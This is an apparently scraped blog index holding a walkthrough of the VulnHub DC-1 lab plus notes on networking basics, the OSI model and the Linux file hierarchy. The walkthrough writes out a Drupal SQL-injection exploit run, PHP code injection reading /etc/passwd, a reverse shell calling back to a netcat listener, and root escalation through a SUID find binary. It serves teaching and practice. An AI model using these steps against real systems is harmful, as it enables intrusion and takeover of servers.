‚Äúinstall.php‚Äù 000000005: 200 0 L 6 W 42 Ch ‚Äúxmlrpc.php‚Äù 000000237: 200 9 L 15 W 283 Ch ‚Äúrss.xml‚Äù ","date":"01-20-2023","objectID":"/dc-1/:2:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Researching Vulnerabilities I was hoping to find something more than just a general version 7 of Drupal‚Ä¶ e.g., 7.26, but that‚Äôs okay. Let‚Äôs go ahead and run searchsploit against Drupal and see what we get back. searchsploit Drupal DC-1 Drupal 7 searchsploit Well, good news is there isn‚Äôt many version 7 exploits! We‚Äôre looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn‚Äôt require authentication, although we can make a user at /user/register. There‚Äôs always the chance a non-privileged user would have enough privs to execute such an exploit. The Drupalgeddon2 sticks out to me but I want a more manual approach and something that‚Äôll be sure to work with version 7.xx ‚Ä¶ Let‚Äôs go with the php/webapps/34992.py. We could use msfconsole and let that automate most of what we‚Äôll do below, but what‚Äôs the fun in that! My thought process is that we‚Äôll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we‚Äôll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that‚Äôs a start‚Ä¶ Download the script to a local directory and cat the contents‚Ä¶ searchsploit -m php/webapps/34992.py \u003c‚Äì This will download the script to the current directory using searchsploit. Love this feature. cat 34992.py \u003c‚Äì This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don‚Äôt hold your hand, so knowing how to read code is very helpful. You‚Äôll see this line which tells us the command options needed, so we can successfully execute the script against the target. DC-1 Drupal 7 exploit usage: %prog **-t http[s]://TARGET_URL -u USER -p PASS**\\n So we‚Äôll try‚Ä¶ python2 34992.py -t http://$IP -u owned -p owned This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I‚Äôm just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good. ","date":"01-20-2023","objectID":"/dc-1/:3:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploitation Well‚Ä¶ let‚Äôs get to it. python2 34992.py -t http://$IP -u owned -p owned IF YOU GET A ‚ÄúSyntaxError: Missing parentheses in call to ‚Äòprint‚Äô. Did you mean print(‚Ä¶)?‚Äù‚Ä¶ you‚Äôre not running the script under python2‚Ä¶ which is required. DC-1 Drupal 7 admin created Now let‚Äôs test the login page‚Ä¶ with owned:owned. ADMIN LOGGED IN DC-1 Drupal 7 admin logged in Now that we‚Äôre in a CMS, we should look around and enumerate what we can‚Ä¶ ","date":"01-20-2023","objectID":"/dc-1/:4:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Enumerating Drupal admin pages It‚Äôs important to gather as much information as you can as it might come into handy later on‚Ä¶ so let‚Äôs see what we can find inside Drupal as admin. Username Fred found Username admin found So brute forcing may have been an option but maybe it has lockout? flag3 is found under content‚Ä¶ Special PERMS will help FIND the passwd - but you‚Äôll need to -exec that command to work out how to get what‚Äôs in the shadow. This seems to hint to maybe the find command allowing us access to certain files we shouldn‚Äôt have access to? Sticky bit? Worth checking once we‚Äôre in‚Ä¶ Let‚Äôs look in the module tab and see if there‚Äôs anything php related‚Ä¶ I found and enabled the follow module‚Ä¶ ‚ÄúPHP filter‚Äù. It may just allow us to upload malicious PHP code. DC-1 Drupal 7 Enabled PHP Filter Not that it‚Äôs enabled, we should see if we can give it administrator rights.. Click the ‚ÄúPermissions‚Äù and then check the ‚Äúadministrator‚Äù user box for ‚ÄúUse the PHP code text format‚Äù DC-1 Drupal 7 PHP code permissions DC-1 Drupal 7 admin perms for php code I‚Äôm hoping by checking the admin box, this will allow any code inputted to be executed with admin privs. ","date":"01-20-2023","objectID":"/dc-1/:4:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploiting PHP module Now that it‚Äôs enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file‚Ä¶, if we have root privs.. doubtful. Content \u003e Add Content \u003e Basic Page Title = Whatever you want Body is where we‚Äôll test the injection‚Ä¶ \u003c?php system(\"whoami\"); ?\u003e Change ‚ÄúText Format‚Äù to the PHP code module, which is what we enabled with admin privs Then press preview‚Ä¶ let‚Äôs see if we can grab the current user‚Ä¶ We got a response! ‚Äúwww-data‚Äù. Injection is working! DC-1 Drupal 7 PHP code injection! Let‚Äôs change the command from whoami to cat /etc/passwd. Looks like another two users to notate. www-data and flag4 C-1 Drupal 7 PHP code injection - passwd file Trying sudo cat /etc/shadow fails, so we don‚Äôt have sudo or root privs. Sudo may not even be installed ","date":"01-20-2023","objectID":"/dc-1/:4:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"PHP revshell Now it‚Äôs time to get ourselves a revshell through php injection‚Ä¶ let‚Äôs insert the following php code from this raw github file‚Ä¶ PentestMonkey‚Äôs PHP revshell You‚Äôll want to modify the following lines of code to match up with your nc -nvlp 1234 command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. You can change the ports to whatever you‚Äôd like. $ip = ‚Äò192.168.56.1‚Äô; // CHANGE THIS $port = 1234; // CHANGE THIS Now open up another terminal with the nc -nvlp 1234, I mentioned before. You should now have both: terminal with nc -nvlp 1234 running. Drupal Basic Page filled in with PentestMonkey‚Äôs reverse php shell Let‚Äôs hit preview and we should get a revshell as www-data. If we do, we‚Äôll move onto privilege escalation. The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you‚Äôll lose your revshell. We now have a revshell into the box but lacks tty! We‚Äôll fix this in the next section. Let‚Äôs do a quick test by typing whoami into our new revshell. You should see ‚Äúwww-data‚Äù. DC-1 Drupal 7 - revshell w/o tty ","date":"01-20-2023","objectID":"/dc-1/:4:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Privilege Escalation At this point, we now have a revshell into DC-1 whom does not have root privs. We‚Äôll need to find a way to escalate the privs, so we can ‚Äòown‚Äô the box! ","date":"01-20-2023","objectID":"/dc-1/:5:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Custom tty First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C. python -c 'import pty; pty.spawn(\"/bin/bash\")' export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll='ls -lsaht --color=auto' Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 Now that you have a tty shell, with alias ll, and you can‚Äôt CTRL+C out of it on accident.. Let‚Äôs get to privesc(privilege escalation) but before that let‚Äôs update our ‚Äônotes‚Äô Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version? Drupal -\u003e Admin acct created owned:owned with Drupal 7.x SQLi exploit -\u003e enabled php-code and created basic content to inject php-revshell giving us low-level shell. -\u003e shifted into a tty that doesn‚Äôt allow CTRL+C disconnects -\u003e now time to dig into privesc 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys Found Users: Fred ; admin ; www-data ; flag4 At this point, we want to look through the box and enumerate anything we can find. For time sake, we‚Äôll skip most of this. We could transfer linpeas.sh to enumerate the system for us, but let‚Äôs try without it. I like to look for binaries that have SUID or GUID perms. These SUIDs and GUIDs are binaries that have a perm set to s in the user or group column. What makes these binaries so attractive is that they are executed with the owner‚Äôs privs(think root üòÉ) but can be accessible and executable by lower priv users/groups. Once we produce a list of SUID/GUID binaries, we can check them against GTFObins ","date":"01-20-2023","objectID":"/dc-1/:5:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"SUID Search Let‚Äôs look for SUID binaries! find / -perm -u=s -type f 2\u003e/dev/null DC-1 Drupal 7 - SUID search Here‚Äôs the find binary. Look at the perms. You‚Äôre looking for an s in place of the executable bit set for user group. DC-1 Drupal 7 - SUID example ","date":"01-20-2023","objectID":"/dc-1/:5:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Searching GTFObins Let‚Äôs look on GTFObins to see if any of these binaries have a SUID exploit that obtains and holds elevated privs. - /bin/mount - only has Sudo which isn‚Äôt installed on the box. So, pass. - /bin/ping - no SUID abuse - /bin/su - no SUID abuse - /bin/ping6 - isn‚Äôt listed - /bin/umount - isn‚Äôt listed - /usr/bin/at - no SUID abuse - /usr/bin/chsh - isn‚Äôt listed - /usr/bin/passwd - isn‚Äôt listed - /usr/bin/newgrp - isn‚Äôt listed - /usr/bin/chfn - isn‚Äôt listed - /usr/bin/gpasswd - isn‚Äôt listed - /usr/bin/procmail - isn‚Äôt listed - /usr/bin/find - WE HAVE A HIT! SUID bit can be abused! - command will be /usr/bin/find -exec /bin/sh \\; -quit ","date":"01-20-2023","objectID":"/dc-1/:5:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Abusing the SUID Copy/paste /usr/bin/find -exec /bin/sh \\; -quit in the tty remote shell you have running in your terminal and let‚Äôs see if we can abuse the SUID bit to escalate privs to root‚Ä¶ $$$ - We have root! ","date":"01-20-2023","objectID":"/dc-1/:5:4","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"ROOTED! DC-1 Drupal 7 - ROOTED!!! ","date":"01-20-2023","objectID":"/dc-1/:6:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["Computer Networks"],"content":"Basics of Networking A network is two or more hosts connected together in order to exchange data. There‚Äôs two network types: WAN (Wide Area Network) - network that connects large geographical areas. LAN (Local Area Network) - network that is confined within a WAN network. These networks use the OSI Layers to exchange data. ","date":"12-20-2022","objectID":"/networking/:1:0","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"IP addresses - Part 1/2 of TCP/IP network config (Layer 3) IP Addressing provides two functions: Identifies a device‚Äôs network interface on a network. Gives a network device a network location to enable communications. Network and Host IDs An IP address is a binary number which is normally shown as a 32-bit decimal number divided, by decimals, into four separate 8-bit sections(octets). This number represents two logical sections that determine the network ID and host ID.(more details in subnet section) Network ID provides the subnet a unique number and specifies the network class(A, B, or C). Host ID gets assigned to the network device and uniquely identifies the host. Example: 192.168.1.1 /24(255.255.255.0) Network ID = 192.168.1 \u003c‚Äì The first three octets specify the subnet‚Äôs network ID and never changes. This tells the router which subnet to route the packet to. Host ID = 0.0.0.1 \u003c‚Äì The last octet is used for assigning IP addresses to host network devices. This tells the router which host, inside the network ID subnet, to route the packet to. IP Address Assignment IP addresses are assigned in two different ways: Dynamic - The DHCP(Dynamic Host Configuration Protocol) server will assign an IP address to a network device based on the MAC address of the network interface. Static - DHCP server isn‚Äôt involved meaning the device network interface must assign its own IP address, MAC address, and Gateway address to a fixed value. ","date":"12-20-2022","objectID":"/networking/:1:1","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnets As a network grows, it can start to become unmanageable resulting it unwanted effects like the lack of IP addresses and poor security, organization, and performance. A solution to this is to split up the larger network into smaller networks aka subnetting. A subnet, or sub-network, is simply a network sitting inside another network defined by a different IP address(network ID). When you increase the number of subnets you decrease the number of hosts per subnet. Separating the network improves: Security - by isolation. Performance - by reducing the amount of broadcasts and avoiding routers. Administration - by separating critical network devices and creating redundancies. Traffic going from one subnet to another subnet needs routed(router / gateway). ","date":"12-20-2022","objectID":"/networking/:1:2","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnet masks - Part 2/2 of TCP/IP network config (Layer 3) Subnet masks are used, in TCP/IP, to specify if the network interface is within the same local subnet or within another subnet. Subnet masks are also 32-bit numbers and tell us which part of the IP address represents the Network ID and which part represents the Host ID range. When looking at a binary subnet mask, the binary 1‚Äôs represent Network ID and the binary 0‚Äôs represent Host ID range. /24 = 255.255.255.0 = CIDR tells you, from left to right, how many 1‚Äôs the subnet mask has enabled 255.255.255.0(is a decimal representation of the following binary number = 11111111.11111111.11111111.00000000) 11111111.11111111.11111111.00000000 = this is /24 in binary. From left to right, you‚Äôll see that 24 1‚Äôs are enabled. In each octet section, you can have a maximum of 256 addresses. From left to right, each binary represents this number = 128 - 64 - 32 - 16 - 8 - 4 - 2 - 1 . Add those up and you‚Äôll get 256. This explanation of CIDR to decimal to binary also applies to IP addresses. ","date":"12-20-2022","objectID":"/networking/:1:3","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"IP Addressing Example Simple break down of an IP Address Line up the binaries for the IP address and subnet mask IP Address = 192.168.123.132, Subnet = /24(CIDR) aka 255.255.255.0 11000000.10101000.01111011.10000100 = Binary representation of IP address 192.168.123.132 11111111.11111111.11111111.00000000 = Binary representation of subnet 255.255.255.0. 1‚Äôs equal Network ID \u0026 0‚Äôs equal Host ID range. Look at the first octet section of the subnet mask(starting from the left side). Where we see a 1, we need to carry over the IP address‚Äôs matching binary value to start building the Network ID. So overall, we need to carry over each binary value of the first three octets of the IP address to the Network ID since the subnet mask binaries are all 1‚Äôs in those first three octets. When we get to the binary 0‚Äôs, of the subnet mask, we then copy the matching IP address binary value over to the Host ID. We get the following: 11000000.10101000.01111011.00000000 - 192.168.123 Network ID 00000000.00000000.00000000.10000100 - 0.0.0.132 Host ID ","date":"12-20-2022","objectID":"/networking/:1:4","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Subnetting Example Finding the Host ID range, Network ID, and Broadcast IP from only knowing one IP address and it‚Äôs subnet mask Let‚Äôs drag down the same IP address from above but change the subnet mask, then work off that. 11111111.11111111.11111111.11|000000 = Subnet mask = /26 = 255.255.255.192 11000000.10101000.01111011.10|000100 = IP Address within the subnet = 192.168.123.132 Again, the subnet mask tells us which bits, in the IP address, are used for the network ID and which are used for the host ID range. Any enabled bit on the left side of the | is for the network ID. This | sits just to the right of the last enabled bit within the subnet mask. Network ID binaries do not change. Any disabled bit on the right side of the | is for the host IP range. 11000000.10101000.01111011.10|000000 = network ID in bold = 192.168.123.128 11000000.10101000.01111011.10|000000 through 11000000.10101000.01111011.10|111111 = host ID range in bold = 192.168.123.128 through 192.168.123.191 Out of the host ID range we get three values: Network ID(lowest number of the Host IP range) = 192.168.123.128 Usable Host range = 192.168.123.129 through 192.168.123.190 This gives us 62 IP addresses to assign to hosts within the 192.168.123 subnet. Broadcast ID(highest number of the Host IP range) = 192.168.123.191 ","date":"12-20-2022","objectID":"/networking/:1:5","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"TCP vs UDP (Layer 4) TCP = Transmission Control Protocol Reliable Connection oriented - 3-way handshake SYN \u003e SYN ACK \u003e ACK. Considered reliable since it only sends data once a connection is established. Packets delivered in the same order sent and resent as needed. Dynamically manages congestion Much slower than UDP(higher latency and slower throughput). Uses more resources since more calculations are made. Data taken apart \u003e sent \u003e reconstructed. UDP = User Datagram Protocol Unreliable Connectionless oriented - No handshake Faster than TCP(Low latency with loss-tolerance and faster throughput) Used by real-time apps(video, audio, etc) Error packets are discarded ","date":"12-20-2022","objectID":"/networking/:1:6","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"Common Ports and Protocols TCP FTP (21) SSH (22) Telnet (23) SMTP (25) DNS (53) HTTP (80, 8080) Kerberos (88) POP3 (110) RpcBind (111) NNTP (119) NTP (123) RPC (135) SMB (139 + 455) IMAP (143) IRC (194) HTTPS (443, 8443) UDP DNS (53) DHCP (67,68) TFTP (69) SNMP (161, 162) ","date":"12-20-2022","objectID":"/networking/:1:7","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"DNS (Layer 7) Domain Name System DNS‚Äôs main task is to associate domain names with their decimal IP addresses. Domain Names help identify services that reside on the internet, like websites. The most common way people interact with DNS is through their browser. Let‚Äôs start by opening a terminal window and run the following: nslookup google.com If you look down in the ‚ÄúNon-authoritative answer:‚Äù section, you‚Äôll see the ‚ÄúName: google.com‚Äù along with the IP address given to us by a DNS server. In my case, it‚Äôs ‚ÄúAddress: 142.250.191.142‚Äù Without DNS, when you type google.com, into a browser, IP protocols wouldn‚Äôt know what to do with that as it‚Äôs not a decimal IP address. So to make our lives easier, a DNS server resolves an IP address to connect to and the browser just presents it as ‚Äúgoogle.com‚Äù. If you take the google.com associated IP address, in your nslookup command output, and enter that into a browser‚Äôs address bar, it‚Äôll go to google.com without an issue. If you ever find yourself having issues resolving a website but you can ping another system‚Ä¶ broken DNS may be the cause. DNS is a meme these days since you‚Äôll hear people joke about ‚ÄúDid you check DNS‚Äù as it‚Äôs a common issue in IT. ","date":"12-20-2022","objectID":"/networking/:1:8","tags":["Network Ports","Network Protocols","How-To","Subnetting","DNS","Subnets","IP Addressing"],"title":"Networking Basics","uri":"/networking/"},{"categories":["Computer Networks"],"content":"OSI Layers \u0026 PDU OSI Model is a 7 abstract layer table that‚Äôs responsible for explaining the flow of data within a network. Experienced individuals will often call out an issue by the culprit layer number. example: ‚ÄúThis is a level 3 issue.‚Äù Protocol data unit(PDU) is a name given to the data when passing through each OSI layer. Bits, Frames, etc. ","date":"12-20-2022","objectID":"/osi-model/:1:0","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Physical - Layer 1 - Bits (PDU) Bit-by-bit delivery, modulation, start-stop signals, physical network. Anything to do with physical transmission of data. From transmission mode(full, half duplex) to pinout of a ethernet connector. Some related devices: Ethernet hub, repeater, and physical transmission medium(wire, plug, outlet). ","date":"12-20-2022","objectID":"/osi-model/:1:1","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Data link - Layer 2 - Frames (PDU) Encapsulation, frame sync, LLC, and MAC address. Provides a link between two devices, via a physical layer, and provides flow control. It also detects and corrects errors on layer 1. Defines two sublayers: Media Access Control(MAC) - controls device access and grants permissions for data transit. Logical link control(LLC) - flow control, handles network layer protocols and error checking/frame sync. Some related devices: Switch, bridge, NIC. ","date":"12-20-2022","objectID":"/osi-model/:1:2","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Network - Layer 3 - Packets (PDU) Controls addressing, routing, and traffic control. This layer routes packets between two network nodes by providing cross-network addressing, routing, and updates both routing tables \u0026 fragmented packets. ","date":"12-20-2022","objectID":"/osi-model/:1:3","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Transport - Layer 4 - Segments \u0026 Datagrams (PDU) Reliability, flow control, connection-oriented communications, and multiplexing. Layer 4 is responsible for segmenting data and relieving congestion by determining the protocol to be used(TCP and UDP, or others), size of window(packet size(MTU)), and order of transmission. ","date":"12-20-2022","objectID":"/osi-model/:1:4","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Session - Layer 5 - Data (PDU) Session management(build and control sessions) between two hosts. Authentication, Authorization, Session restoration. This layer opens, manages, and closes sessions between end-user application processes. API, sockets, and WinSock. ","date":"12-20-2022","objectID":"/osi-model/:1:5","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Presentation - Layer 6 - Data (PDU) Translation ‚Äì\u003e data (de)compression ‚Äì\u003e data (de)encryption. This layer converts data (MOV, JPEG, ASCII, etc) to and from the form that the application layer accepts, so it can be sent over the network. ","date":"12-20-2022","objectID":"/osi-model/:1:6","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Computer Networks"],"content":"Application - Layer 7 - Data (PDU) Communication protocol and interface methods, used by host processes, to enable network communications. In other words, applications handling data through specific protocols which then is sent through layer 6. This would include HTTP(S), IMAP, POP3, SMTP, FTP, SSH, etc. Also provides service advertisement on the network. ","date":"12-20-2022","objectID":"/osi-model/:1:7","tags":["OSI Model","OSI Layers"],"title":"OSI Model","uri":"/osi-model/"},{"categories":["Linux"],"content":"/ Root - Where it begins Linux uses a tree oriented hierarchy, meaning it starts at one point and branches outward. This starting point is the / (system root) directory. This particular hierarchy layout is based on the FHS (Filesystem Hierarchy Standard). ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:1:0","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"},{"categories":["Linux"],"content":"FHS - (Filesystem Hierarchy Standard) Maintained by the Linux Foundation and last updated on June 3rd, 2015 (as of 12-16-22). FHS provides UNIX-like operating systems with a set of file and directory requirements and guidelines. ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:2:0","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"},{"categories":["Linux"],"content":"Common directories that sit under / (system root). /bin - Essential command binaries used by the user and system. /boot - Stores data required for system boot. /dev - Files that represent devices attached to the system. /etc - Static configuration files (not binaries) for the system. /home - Location for individual files of particular user. /lib - Essential shared libraries and kernel modules (drivers). /media - Mount point for removable media. /mnt - Mount point for mounting a filesystem temporarily. /opt - Add-on application software packages. /root - Home directory for the root user.. /run - Data relevant to running processes since boot /sbin - Essential system binaries. /srv - Data for services provided by this system. /tmp - Temporary files (reboot usually clears this directory). /usr - Second major hierarchy (binaries and data). /bin - Most executable commands. /include - Header files for compiling programs written in C. /lib - More libraries and data files. /local - User installed software. /sbin - Non-Essential binaries for sysadmin. /share - Hierarchy for read-only architecture independent data files. /var - Hierarchy for variable data to sit in (logs, cache, software states). /cache - Cache data from applications. /lib - Variable state information for applications and system. /local - Variable data for /usr/local. /lock - Lock files. /log - Log files and directories. /opt - Variable data for /opt. /run - Runtime variables. /spool - Application spool (queued) data. /tmp - Temporary files preserved between system reboots. ","date":"12-05-2022","objectID":"/linuxfilehierarchy/:2:1","tags":["Linux File Structure","Linux File Hierarchy","Everything is a file"],"title":"Linux File Hierarchy","uri":"/linuxfilehierarchy/"}]